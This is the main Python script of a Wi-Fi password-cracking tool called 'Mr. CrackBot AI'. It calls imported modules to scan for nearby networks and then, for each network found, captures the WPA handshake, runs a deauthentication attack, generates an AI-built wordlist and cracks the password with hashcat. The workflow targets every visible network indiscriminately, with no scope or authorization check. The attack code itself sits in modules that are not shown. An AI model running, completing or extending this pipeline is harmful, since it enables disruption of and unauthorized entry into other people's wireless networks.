from network.scanner import scan_networks
from network.handshake import capture_handshake
from network.deauth import deauth_attack
from cracking.wordlist_manager import WordlistManager
from cracking.hashcat_wrapper import crack_password
from ai.feature_extractor import extract_features
from ui.main_window import MainWindow
from utils.config import ensure_directories, check_prerequisites, print_configuration

# Additional imports for future expansion
import logging

# Set up logging
logging.basicConfig(filename="mr_crackbot_ai.log", level=logging.INFO)


def pre_gui_setup():
    """
    Perform all pre-GUI setup tasks, including printing configuration,
    ensuring directories, and validating prerequisites.
    """
    print("[*] Initializing Mr. CrackBot AI...")

    # Print configuration settings
    print_configuration()

    # Ensure directories exist
    try:
        ensure_directories()
    except Exception as e:
        print(f"[!] Failed to set up directories: {e}")
        exit(1)

    # Validate required tools
    try:
        check_prerequisites()
    except RuntimeError as e:
        print(f"[!] Missing prerequisites: {e}")
        exit(1)

    print("[*] Pre-GUI setup complete.")


def main_workflow():
    """
    Perform the main workflow for scanning networks, capturing handshakes,
    and cracking passwords.
    """
    # Step 1: Scan for networks
    print("[*] Scanning for networks...")
    networks = scan_networks()

    if not networks:
        print("[!] No networks found.")
        return

    for network in networks:
        ssid = network["ssid"]
        bssid = network["bssid"]
        channel = network["channel"]
        print(f"[*] Targeting network: {ssid} ({bssid})")

        # Step 2: Capture handshake
        handshake_file = capture_handshake(bssid, channel)

        # Step 3: Perform deauthentication attack
        deauth_attack(bssid)

        # Step 4: Extract network features
        features = extract_features(ssid, bssid)

        # Step 5: Generate wordlist with AI
        wordlist_manager = WordlistManager()
        wordlist = wordlist_manager.generate_wordlist(features)

        # Step 6: Crack password
        crack_password(handshake_file, wordlist)


if __name__ == "__main__":
    # Pre-GUI setup
    pre_gui_setup()

    # Run the main workflow
    main_workflow()

    # Launch the GUI
    print("[*] Launching GUI...")
    app = MainWindow()
    app.run()

    # Post-GUI placeholder (if needed)
    print("[*] Mr. CrackBot AI has exited.")
